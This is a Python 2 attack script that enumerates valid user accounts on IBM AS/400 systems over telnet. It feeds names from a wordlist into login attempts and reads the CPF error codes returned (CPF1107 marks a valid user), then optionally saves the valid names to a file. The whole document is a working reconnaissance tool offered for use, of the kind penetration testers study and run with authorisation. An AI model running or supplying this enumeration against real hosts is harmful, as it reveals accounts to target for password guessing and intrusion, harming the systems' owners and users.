import telnetlib
import argparse


def loadUser(filename):
	users = []

	with open(filename, "r") as fp:
		for user in fp:
			users.append(user.strip())
	return users

def enumerate(host, user, verbose):
	tn = telnetlib.Telnet(host)
	tn.write('\r')
	tn.write(user)
	tn.write('\r')

	while True:
		data = tn.read_some()
		if "CPF1107" in data :
			print "[*] {} is a valid user".format(user)
			return user
		elif "CPF1394" in data:
			if verbose:
				print "[-] User profile {} cannot sign on".format(user)
			break
		elif "CPF1109" in data:
			if verbose:
				print "[-] {} is not authorized to subsystem".format(user)
			break
		elif "CPF1110" in data:
			if verbose:
				print "[-] {} is not authorized to subsystem".format(user)
			break
		elif "CPF1118" in data:
			break
		elif "CPF1133" in data:
			break
		elif "CPF1120" in data:
			break
		elif "CPF1116" in data:
			break
		elif "CPF1392" in data:
			break			

if __name__ == '__main__':
	print "\nEnumerate Users on AS400 using telnet\n"

	users = []
	valid_users = []
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--verbose", help="Increase output verbosity", action="store_true")
	parser.add_argument("-o", "--output", type=str, help="Write valid users to an output file")
	group = parser.add_argument_group("required arguments")
	group.add_argument("-i", "--ip", type=str, help="Ip address of the host", required=True)
	group.add_argument("-f", "--filename", type=str, help="File that contain the users to enumerate", required=True)
	
	args = parser.parse_args()

	verbose = args.verbose
	host = args.ip
	enum_users_file = args.filename
	valid_users_file = args.output

	users = loadUser(enum_users_file)
	print "[+] {} Users loaded".format(len(users))
	print "[+] Enumeration started. Each attempt does a login tentative."
	for user in users:
		validuser = enumerate(host, user, verbose)
		if validuser:
			valid_users.append(validuser)

	if valid_users_file:
		print "[+] Writing valid user to file"
		file = open(valid_users_file, "w")
		for user in valid_users:
			file.write(user)

